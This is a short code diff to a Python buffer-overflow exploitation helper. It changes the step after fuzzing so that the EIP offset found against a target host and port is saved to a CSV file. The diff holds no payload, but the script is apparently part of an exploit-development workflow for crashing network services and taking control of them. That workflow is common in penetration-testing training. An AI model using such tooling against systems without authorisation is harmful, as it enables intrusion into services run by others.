@@ -78,4 +78,10 @@ if not fuzzingSkip:
             file.close()
             
 if query_yes_no("Do not forget to restart the service, if it has crashed. Do you want start the second step to find EIP?"):
-    findEIP(buffer, dataDict["lenCrash"], dataDict['host'], int(dataDict['port']))
+    offset = findEIP(buffer, dataDict["lenCrash"], dataDict['host'], int(dataDict['port']))
+    if offset != 0:
+        dataDict['offset'] = offset
+        with open("save-buffer-overflow.csv", "a+") as file:
+            writer = csv.writer(file)
+            writer.writerow(["offset", dataDict['offset']])
+            file.close()
